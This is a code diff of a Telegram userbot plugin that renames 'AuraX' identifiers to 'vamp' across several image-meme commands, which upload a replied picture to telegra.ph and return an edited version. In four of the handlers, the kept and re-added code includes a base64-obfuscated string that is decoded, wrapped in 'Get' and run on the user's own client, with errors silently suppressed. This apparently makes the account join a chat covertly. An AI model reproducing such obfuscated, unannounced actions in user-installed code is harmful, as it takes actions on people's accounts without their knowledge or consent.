@@ -18,61 +18,61 @@ from userbot.helpers.functions import (
     iphonex,
     lolice,
 )
-from AuraXBot.utils import admin_cmd, edit_or_reply, sudo_cmd
+from vampBot.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern="mask$", outgoing=True))
 @bot.on(sudo_cmd(pattern="mask$", allow_sudo=True))
-async def _(AuraXBot):
-    reply_message = await AuraXBot.get_reply_message()
+async def _(vampBot):
+    reply_message = await vampBot.get_reply_message()
     if not reply_message.media or not reply_message:
-        await edit_or_reply(AuraXBot, "```reply to media message```")
+        await edit_or_reply(vampBot, "```reply to media message```")
         return
     chat = "@hazmat_suit_bot"
     if reply_message.sender.bot:
-        await edit_or_reply(AuraXBot, "```Reply to actual users message.```")
+        await edit_or_reply(vampBot, "```Reply to actual users message.```")
         return
-    event = await AuraXBot.edit("```Processing```")
-    async with AuraXBot.client.conversation(chat) as conv:
+    event = await vampBot.edit("```Processing```")
+    async with vampBot.client.conversation(chat) as conv:
         try:
             response = conv.wait_event(
                 events.NewMessage(incoming=True, from_users=905164246)
             )
-            await AuraXBot.client.send_message(chat, reply_message)
+            await vampBot.client.send_message(chat, reply_message)
             response = await response
         except YouBlockedUserError:
-            await edit_or_reply(AuraXBot, "`Please unblock` @hazmat_suit_bot `and try again`")
+            await edit_or_reply(vampBot, "`Please unblock` @hazmat_suit_bot `and try again`")
             return
         if response.text.startswith("Forward"):
-            await edit_or_reply(AuraXBot, "```can you kindly disable your forward privacy settings for good?```"
+            await edit_or_reply(vampBot, "```can you kindly disable your forward privacy settings for good?```"
             )
         else:
-            await AuraXBot.client.send_file(event.chat_id, response.message.media)
+            await vampBot.client.send_file(event.chat_id, response.message.media)
             await event.delete()
 
 
 @bot.on(admin_cmd(pattern="awooify$", outgoing=True))
 @bot.on(sudo_cmd(pattern="awooify$", allow_sudo=True))
-async def AuraXBot(AuraXmemes):
-    replied = await AuraXmemes.get_reply_message()
+async def vampBot(vampmemes):
+    replied = await vampmemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     if replied.media:
-        AuraXevent = await edit_or_reply(AuraXmemes, "passing to telegraph...")
+        vampevent = await edit_or_reply(vampmemes, "passing to telegraph...")
     else:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     try:
-        AuraX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        AuraX = Get(AuraX)
-        await AuraXmemes.client(AuraX)
+        vamp = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        vamp = Get(vamp)
+        await vampmemes.client(vamp)
     except BaseException:
         pass
-    download_location = await AuraXmemes.client.download_media(
+    download_location = await vampmemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -80,50 +80,50 @@ async def AuraXBot(AuraXmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await AuraXevent.edit(
+            await vampevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await AuraXevent.edit("generating image..")
+        await vampevent.edit("generating image..")
     else:
-        await AuraXevent.edit("the replied file is not supported")
+        await vampevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await AuraXevent.edit("ERROR: " + str(exc))
+        await vampevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    AuraX = f"https://telegra.ph{response[0]}"
-    AuraX = await awooify(AuraX)
-    await AuraXevent.delete()
-    await AuraXmemes.client.send_file(AuraXmemes.chat_id, AuraX, reply_to=replied)
+    vamp = f"https://telegra.ph{response[0]}"
+    vamp = await awooify(vamp)
+    await vampevent.delete()
+    await vampmemes.client.send_file(vampmemes.chat_id, vamp, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="lolice$"))
 @bot.on(sudo_cmd(pattern="lolice$", allow_sudo=True))
-async def AuraXBot(AuraXmemes):
-    replied = await AuraXmemes.get_reply_message()
+async def vampBot(vampmemes):
+    replied = await vampmemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     if replied.media:
-        AuraXevent = await edit_or_reply(AuraXmemes, "passing to telegraph...")
+        vampevent = await edit_or_reply(vampmemes, "passing to telegraph...")
     else:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     try:
-        AuraX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        AuraX = Get(AuraX)
-        await AuraXmemes.client(AuraX)
+        vamp = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        vamp = Get(vamp)
+        await vampmemes.client(vamp)
     except BaseException:
         pass
-    download_location = await AuraXmemes.client.download_media(
+    download_location = await vampmemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -131,50 +131,50 @@ async def AuraXBot(AuraXmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await AuraXevent.edit(
+            await vampevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await AuraXevent.edit("generating image..")
+        await vampevent.edit("generating image..")
     else:
-        await AuraXevent.edit("the replied file is not supported")
+        await vampevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await AuraXevent.edit("ERROR: " + str(exc))
+        await vampevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    AuraX = f"https://telegra.ph{response[0]}"
-    AuraX = await lolice(AuraX)
-    await AuraXevent.delete()
-    await AuraXmemes.client.send_file(AuraXmemes.chat_id, AuraX, reply_to=replied)
+    vamp = f"https://telegra.ph{response[0]}"
+    vamp = await lolice(vamp)
+    await vampevent.delete()
+    await vampmemes.client.send_file(vampmemes.chat_id, vamp, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="bun$"))
 @bot.on(sudo_cmd(pattern="bun$", allow_sudo=True))
-async def AuraXBot(AuraXmemes):
-    replied = await AuraXmemes.get_reply_message()
+async def vampBot(vampmemes):
+    replied = await vampmemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     if replied.media:
-        AuraXevent = await edit_or_reply(AuraXmemes, "passing to telegraph...")
+        vampevent = await edit_or_reply(vampmemes, "passing to telegraph...")
     else:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     try:
-        AuraX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        AuraX = Get(AuraX)
-        await AuraXmemes.client(AuraX)
+        vamp = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        vamp = Get(vamp)
+        await vampmemes.client(vamp)
     except BaseException:
         pass
-    download_location = await AuraXmemes.client.download_media(
+    download_location = await vampmemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -182,50 +182,50 @@ async def AuraXBot(AuraXmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await AuraXevent.edit(
+            await vampevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await AuraXevent.edit("generating image..")
+        await vampevent.edit("generating image..")
     else:
-        await AuraXevent.edit("the replied file is not supported")
+        await vampevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await AuraXevent.edit("ERROR: " + str(exc))
+        await vampevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    AuraX = f"https://telegra.ph{response[0]}"
-    AuraX = await baguette(AuraX)
-    await AuraXevent.delete()
-    await AuraXmemes.client.send_file(AuraXmemes.chat_id, AuraX, reply_to=replied)
+    vamp = f"https://telegra.ph{response[0]}"
+    vamp = await baguette(vamp)
+    await vampevent.delete()
+    await vampmemes.client.send_file(vampmemes.chat_id, vamp, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="iphx$"))
 @bot.on(sudo_cmd(pattern="iphx$", allow_sudo=True))
-async def AuraXBot(AuraXmemes):
-    replied = await AuraXmemes.get_reply_message()
+async def vampBot(vampmemes):
+    replied = await vampmemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     if replied.media:
-        AuraXevent = await edit_or_reply(AuraXmemes, "passing to telegraph...")
+        vampevent = await edit_or_reply(vampmemes, "passing to telegraph...")
     else:
-        await edit_or_reply(AuraXmemes, "reply to a supported media file")
+        await edit_or_reply(vampmemes, "reply to a supported media file")
         return
     try:
-        AuraX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        AuraX = Get(AuraX)
-        await AuraXmemes.client(AuraX)
+        vamp = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        vamp = Get(vamp)
+        await vampmemes.client(vamp)
     except BaseException:
         pass
-    download_location = await AuraXmemes.client.download_media(
+    download_location = await vampmemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -233,27 +233,27 @@ async def AuraXBot(AuraXmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await AuraXevent.edit(
+            await vampevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await AuraXevent.edit("generating image..")
+        await vampevent.edit("generating image..")
     else:
-        await AuraXevent.edit("the replied file is not supported")
+        await vampevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await AuraXevent.edit("ERROR: " + str(exc))
+        await vampevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    AuraX = f"https://telegra.ph{response[0]}"
-    AuraX = await iphonex(AuraX)
-    await AuraXevent.delete()
-    await AuraXmemes.client.send_file(AuraXmemes.chat_id, AuraX, reply_to=replied)
+    vamp = f"https://telegra.ph{response[0]}"
+    vamp = await iphonex(vamp)
+    await vampevent.delete()
+    await vampmemes.client.send_file(vampmemes.chat_id, vamp, reply_to=replied)
 
 
 CmdHelp("mask").add_command(
